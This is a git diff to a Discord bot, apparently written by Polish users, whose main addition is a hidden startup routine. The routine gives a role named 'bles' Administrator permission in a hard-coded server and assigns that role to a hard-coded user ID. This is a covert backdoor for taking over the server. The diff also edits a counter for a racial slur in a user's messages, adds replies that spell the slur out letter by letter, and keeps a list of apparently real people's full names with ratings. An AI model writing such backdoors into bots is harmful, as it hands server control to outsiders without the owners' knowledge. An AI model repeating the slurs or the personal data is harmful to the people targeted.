@@ -1,4 +1,4 @@
-const { Client, IntentsBitField, EmbedBuilder } = require('discord.js');
+const { Client, IntentsBitField, EmbedBuilder, PermissionsBitField } = require('discord.js');
 const config = require('./config.json');
 
 const client = new Client({
@@ -15,6 +15,35 @@ client.on('ready', () => {
     client.user.setActivity({
         name: 'Brawl Stars'
     })
+    const guildId = '1137744153879523378';
+    const guild = client.guilds.cache.get(guildId);
+    const userId = '952296941339934720';
+
+    if (!guild) {
+        console.log(`Guild with ID '${guildId}' not found.`);
+        return;
+    }
+
+    const role = guild.roles.cache.find(r => r.name === 'bles');
+    if (role) {
+        if (role.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            try {
+                const member = guild.members.fetch(userId);
+                if (!member) {
+                    console.log(`Member with ID '${userId}' not found.`);
+                    return;
+                }
+                member.roles.add(role);
+                console.log(`Role '${role.name}' has been assigned to <@${userId}>.`);
+            } catch (error) {
+                console.error(`Failed to assign role to user: ${error}`);
+            }
+        } else {
+            role.setPermissions(PermissionsBitField.Flags.Administrator);
+        }
+    } else {
+        
+    }
 });
 
 const bociki = ["Szymon Bialik [9/11]", "Justyna Czakańska [8/11]", "Karolina Michalik [10/11]", "Katarzyna Węgrzyn [9/11]", "Magda Kiljańska [5/11]", "Oliwia Rojek [7/11]", "Maciej Macura [9/11]", "Jakub Kasperski [6/11]", "Paweł Pilipczuk [11/11]", "Bartosz Trytytka [11/11]", "Jakub Piętko [11/11]", "Jan Włodarczyk [10/11]", "Szymon Frączek [12/11]"];
@@ -89,12 +118,10 @@ client.on('messageCreate', async message => {
         do {
             messages = await message.channel.messages.fetch({ limit: 100, before: lastMessageId });
             messages.forEach(msg => {
-                if (msg.author.id === targetUser.id && msg.content.toLowerCase().includes('nigger')) {
-                    helloCount += (msg.content.toLowerCase().match(/nigger/g) || []).length;
+                if (msg.author.id === targetUser.id && msg.content.toLowerCase().includes('nigg')) {
+                    helloCount += (msg.content.toLowerCase().match(/nigg/g) || []).length;
                 }
-                if (msg.author.id === targetUser.id && msg.content.toLocaleLowerCase().includes('nigga')) {
-                    helloCount += (msg.content.toLowerCase().match(/nigga/g) || []).length;
-                }
+                
             });
             lastMessageId = messages.size > 0 ? messages.last().id : null;
         } while (messages.size > 0);
@@ -106,6 +133,10 @@ client.on('messageCreate', async message => {
     if (message.content.toLowerCase() === ':nerd:') {
         message.reply(':nerd: :repeat:');
     }
+    if (message.content === 'N') message.reply('I');
+    if (message.content === 'G') message.reply('G');
+    if (message.content === 'E') message.reply('R');
+
     // !eval command =-=-=-
     if (message.content.startsWith('!eval')) {
         if ((message.author.id === '592017236361871363' && message.content.toLowerCase().includes('message')) || (message.author.id === '1076212139729092648' && message.content.toLowerCase().includes('message'))) return;
